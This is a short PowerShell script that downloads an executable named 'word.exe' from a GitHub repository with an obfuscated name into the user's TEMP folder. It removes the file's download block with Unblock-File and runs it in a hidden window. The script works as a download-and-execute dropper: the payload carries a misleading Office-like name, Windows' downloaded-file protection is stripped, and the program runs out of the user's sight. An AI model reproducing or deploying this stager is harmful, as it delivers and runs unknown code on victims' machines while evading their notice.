# 1. FIXED URL: Pointing to the RAW content server
$DownloadUrl = "https://github.com/slitch10352/lMKIJ-ujoASJvmrfkjaSdifjergjedgmoirjof9ij-JDunjrr/raw/main/word.exe"

$ExeName     = "word.exe"
$Arguments   = ""
$DestPath    = Join-Path $env:TEMP $ExeName

# Force TLS 1.2 for GitHub's secure servers
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Write-Host "Downloading $ExeName from GitHub..."

try {
    # GitHub handles Invoke-WebRequest well without extra headers
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $DestPath -ErrorAction Stop
    
    # 2. Verify it is a valid Windows Executable (Check for 'MZ' header)
    $Signature = Get-Content -Path $DestPath -Encoding Byte -TotalCount 2
    if ($Signature[0] -ne 0x4D -or $Signature[1] -ne 0x5A) {
         throw "The downloaded file is not a valid EXE. GitHub may have served an error page."
    }

    # 3. Unblock the file for execution
    Unblock-File -Path $DestPath
    Write-Host "Download successful: $DestPath"

} catch {
    Write-Error "Download failed: $_"
    exit 1
}

Write-Host "Running $ExeName silently..."

$StartArgs = @{
    FilePath    = $DestPath
    WindowStyle = "Hidden"
    Wait        = $true
}

if ($Arguments -ne "") {
    $StartArgs.ArgumentList = $Arguments
}

try {
    $Proc = Start-Process @StartArgs -PassThru
    Write-Host "Process finished. Exit Code: $($Proc.ExitCode)"
} catch {
    Write-Error "Failed to run executable: $_"
    exit 1
}
